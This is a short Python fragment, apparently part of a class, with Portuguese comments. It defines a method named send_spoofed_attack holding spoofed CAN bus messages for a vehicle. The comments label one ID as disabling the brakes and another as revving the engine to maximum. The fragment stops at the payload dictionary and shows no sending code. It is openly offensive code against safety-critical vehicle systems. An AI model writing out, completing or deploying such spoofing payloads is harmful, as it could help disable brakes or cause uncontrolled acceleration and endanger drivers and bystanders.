    ...
    def send_spoofed_attack(self):
       # ID de mensagens críticas que serão spoofadas
        critical_message_ids = {
            0x100: [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],  # Exemplo: ID 0x100 desativa freios
            0x200: [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]   # Exemplo: ID 0x200 acelera motor ao máximo
        }
